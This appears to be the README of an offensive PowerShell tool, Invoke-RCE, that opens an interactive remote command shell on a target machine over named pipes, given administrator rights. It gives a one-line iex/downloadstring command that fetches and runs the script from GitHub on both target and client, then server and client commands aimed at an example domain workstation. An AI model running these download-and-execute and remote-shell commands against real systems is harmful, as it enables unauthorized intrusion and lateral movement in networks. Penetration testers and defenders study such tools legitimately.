# Invoke-RCE
A script to gain an interactive shell (Remote-Command-Execution) over a target system

Note: The user you run the script as needs to be administrator over the target system

Run the same script on the target and client system as follows:

```
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/Invoke-RCE/main/Invoke-RCE.ps1')
```

### Server
```
Invoke-RCE -Server
```
```
Invoke-RCE -Server -PipeName Something
```

### Client
```
Invoke-RCE -Client -Target "Workstation-01.ferrari.local"
```
```
Invoke-RCE -Client -Target "Workstation-01.ferrari.local" -PipeName Something
```
